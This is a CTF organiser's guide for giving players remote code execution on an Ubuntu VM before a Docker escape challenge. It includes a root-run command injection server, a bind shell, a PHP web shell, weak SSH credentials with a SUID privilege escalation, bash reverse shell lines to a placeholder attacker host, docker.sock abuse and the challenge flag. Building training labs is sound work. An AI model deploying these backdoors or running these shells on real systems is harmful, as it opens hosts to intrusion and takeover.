# RCE Entry Point Setup - Bridge to Docker Escape Challenge

This guide shows how to create an entry point that gives players Remote Code Execution (RCE) to the Ubuntu VM, so they can then perform the Docker escape challenge.

## Option 1: Simple Command Injection Web App (Easiest)

### Setup

```bash
# Install Python and create a simple vulnerable web server
sudo apt update
sudo apt install -y python3 python3-pip

# Create vulnerable web app
cat > /tmp/rce_server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import subprocess

class RCEHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/execute?'):
            # Parse command from query string
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            cmd = params.get('cmd', [''])[0]
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            if cmd:
                try:
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
                    self.wfile.write(result)
                except Exception as e:
                    self.wfile.write(str(e).encode())
            else:
                self.wfile.write(b'Usage: /execute?cmd=<command>')
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'''
<h1>System Monitor</h1>
<p>Execute commands via: <code>/execute?cmd=whoami</code></p>
<p>Example: <a href="/execute?cmd=id">/execute?cmd=id</a></p>
            ''')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), RCEHandler)
    print('Server running on port 8080...')
    server.serve_forever()
EOF

chmod +x /tmp/rce_server.py

# Run as a service
sudo bash -c 'cat > /etc/systemd/system/rce-entry.service << EOF
[Unit]
Description=RCE Entry Point Server
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /tmp/rce_server.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF'

sudo systemctl daemon-reload
sudo systemctl enable rce-entry.service
sudo systemctl start rce-entry.service
```

### Player Usage

```bash
# From outside, get RCE:
curl "http://<ubuntu-ip>:8080/execute?cmd=whoami"
curl "http://<ubuntu-ip>:8080/execute?cmd=id"
curl "http://<ubuntu-ip>:8080/execute?cmd=bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"
```

---

## Option 2: Reverse Shell Listener (Simple)

### Setup

```bash
# Create a script that gives reverse shell
cat > /tmp/shell_listener.py << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess
import sys

PORT = 4444
HOST = '0.0.0.0'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)

print(f'[*] Listening on {HOST}:{PORT}...')
conn, addr = s.accept()
print(f'[+] Connection from {addr}')

while True:
    try:
        conn.send(b'$ ')
        cmd = conn.recv(1024).decode().strip()
        if cmd.lower() in ['exit', 'quit']:
            break
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        conn.send(result)
    except Exception as e:
        conn.send(str(e).encode())

conn.close()
s.close()
EOF

chmod +x /tmp/shell_listener.py

# Service
sudo bash -c 'cat > /etc/systemd/system/shell-entry.service << EOF
[Unit]
Description=Reverse Shell Entry Point
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /tmp/shell_listener.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF'

sudo systemctl daemon-reload
sudo systemctl enable shell-entry.service
sudo systemctl start shell-entry.service
```

### Player Usage

```bash
# Player connects to get shell
nc <ubuntu-ip> 4444
# Or use socat, netcat, etc.
```

---

## Option 3: PHP Web Shell (Most Realistic)

### Setup

```bash
# Install web server
sudo apt update
sudo apt install -y apache2 php libapache2-mod-php

# Create web shell
sudo bash -c 'cat > /var/www/html/shell.php << EOF
<?php
if(isset($_REQUEST["cmd"])){
    echo "<pre>";
    \$cmd = (\$_REQUEST["cmd"]);
    system(\$cmd);
    echo "</pre>";
    die;
}
?>
EOF'

sudo chown www-data:www-data /var/www/html/shell.php
sudo chmod 644 /var/www/html/shell.php

# Enable PHP
sudo a2enmod php
sudo systemctl restart apache2
```

### Player Usage

```bash
# From browser or curl:
http://<ubuntu-ip>/shell.php?cmd=whoami
http://<ubuntu-ip>/shell.php?cmd=bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"

# Or from terminal:
curl "http://<ubuntu-ip>/shell.php?cmd=id"
```

---

## Option 4: Python HTTP Server with File Upload (Advanced)

### Setup

```bash
cat > /tmp/upload_server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import cgi
import os

UPLOAD_DIR = '/tmp/uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

class UploadHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
<!DOCTYPE html>
<html>
<head><title>File Upload</title></head>
<body>
<h1>Upload File</h1>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
</body>
</html>
        ''')
    
    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST'}
        )
        
        fileitem = form['file']
        if fileitem.filename:
            filepath = os.path.join(UPLOAD_DIR, fileitem.filename)
            with open(filepath, 'wb') as f:
                f.write(fileitem.file.read())
            
            # Make executable if it's a script
            if fileitem.filename.endswith(('.sh', '.py', '.pl')):
                os.chmod(filepath, 0o755)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f'Uploaded: {filepath}'.encode())
        else:
            self.send_response(400)
            self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), UploadHandler)
    print('Upload server on port 8080...')
    server.serve_forever()
EOF

chmod +x /tmp/upload_server.py

# Service
sudo bash -c 'cat > /etc/systemd/system/upload-entry.service << EOF
[Unit]
Description=File Upload Entry Point
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /tmp/upload_server.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF'

sudo systemctl daemon-reload
sudo systemctl enable upload-entry.service
sudo systemctl start upload-entry.service
```

### Player Usage

```bash
# Upload a reverse shell script
# Create shell.sh:
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
EOF

# Upload it
curl -F "file=@shell.sh" http://<ubuntu-ip>:8080/

# Execute it (requires finding where it was uploaded)
curl "http://<ubuntu-ip>:8080/execute?cmd=/tmp/uploads/shell.sh"
```

---

## Option 5: SSH with Weak Credentials + Priv Esc (Realistic)

### Setup

```bash
# Create a low-privilege user
sudo useradd -m -s /bin/bash player
echo "player:password123" | sudo chpasswd

# Give them SSH access
sudo systemctl enable ssh
sudo systemctl start ssh

# Set up privilege escalation vector (SUID binary)
sudo cp /usr/bin/find /home/player/find_suid
sudo chmod 4755 /home/player/find_suid
sudo chown root:root /home/player/find_suid

# Create hint
echo "Look for unusual files in your home directory" > /home/player/hint.txt
sudo chown player:player /home/player/hint.txt
```

### Player Usage

```bash
# SSH in
ssh player@<ubuntu-ip>
# Password: password123

# Find priv esc
/home/player/find_suid . -exec /bin/bash -p \;

# Now they're root and can do Docker escape
```

---

## Option 6: Metasploit Handler (For CTF)

### Setup

```bash
# On the attacker machine, set up handler
# But this requires players to generate payloads first

# Instead, create a simple listener that gives shell
cat > /tmp/msf_handler.py << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess

PORT = 4444
HOST = '0.0.0.0'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
print(f'[*] Listening on {HOST}:{PORT}...')

conn, addr = s.accept()
print(f'[+] Connection from {addr}')

while True:
    try:
        conn.send(b'$ ')
        cmd = conn.recv(1024).decode().strip()
        if not cmd or cmd.lower() == 'exit':
            break
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        conn.send(result)
    except:
        break

conn.close()
EOF

chmod +x /tmp/msf_handler.py
# Add as service (same as Option 2)
```

---

## Recommended Setup (Complete)

Here's a complete setup that gives multiple entry points:

```bash
#!/bin/bash

# 1. Install dependencies
sudo apt update
sudo apt install -y python3 python3-pip apache2 php libapache2-mod-php

# 2. Create command injection web app
cat > /tmp/rce_server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import subprocess

class RCEHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/execute?'):
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            cmd = params.get('cmd', [''])[0]
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            
            if cmd:
                try:
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
                    self.wfile.write(result)
                except Exception as e:
                    self.wfile.write(str(e).encode())
            else:
                self.wfile.write(b'Usage: /execute?cmd=<command>')
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<h1>System Monitor</h1><p>/execute?cmd=whoami</p>')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), RCEHandler)
    server.serve_forever()
EOF

chmod +x /tmp/rce_server.py

# 3. Create service
sudo bash -c 'cat > /etc/systemd/system/rce-entry.service << EOF
[Unit]
Description=RCE Entry Point
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /tmp/rce_server.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF'

# 4. Start service
sudo systemctl daemon-reload
sudo systemctl enable rce-entry.service
sudo systemctl start rce-entry.service

# 5. Ensure Docker challenge is running
cd /home/ubuntu/scada-final-gate
sudo docker compose up -d

echo "[+] RCE Entry Point: http://$(hostname -I | awk '{print $1}'):8080/execute?cmd=whoami"
echo "[+] SCADA Terminal: nc $(hostname -I | awk '{print $1}') 9001"
```

---

## Player's Complete Path

1. **Get RCE:**
   ```bash
   curl "http://<ubuntu-ip>:8080/execute?cmd=id"
   ```

2. **Get Reverse Shell:**
   ```bash
   # On attacker machine:
   nc -lvp 4444
   
   # Via RCE:
   curl "http://<ubuntu-ip>:8080/execute?cmd=bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"
   ```

3. **Access Docker Challenge:**
   ```bash
   # Now they have shell on Ubuntu VM
   nc localhost 9001
   docker exec -it asylum_gate_control /bin/bash
   ```

4. **Docker Escape:**
   ```bash
   # Inside container
   sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/flag
   ```

5. **Unlock Gate:**
   ```bash
   nc localhost 9001
   unlock THM{unl0ckth3g4t350fh3ll}
   ```

---

## Ports Summary

- **Port 8080:** RCE Entry Point (command injection web app)
- **Port 9001:** SCADA Terminal (Docker escape challenge)
- **Port 22:** SSH (optional, for alternative entry)
- **Port 4444:** Reverse Shell Listener (optional)

Choose the option that best fits your challenge scenario!


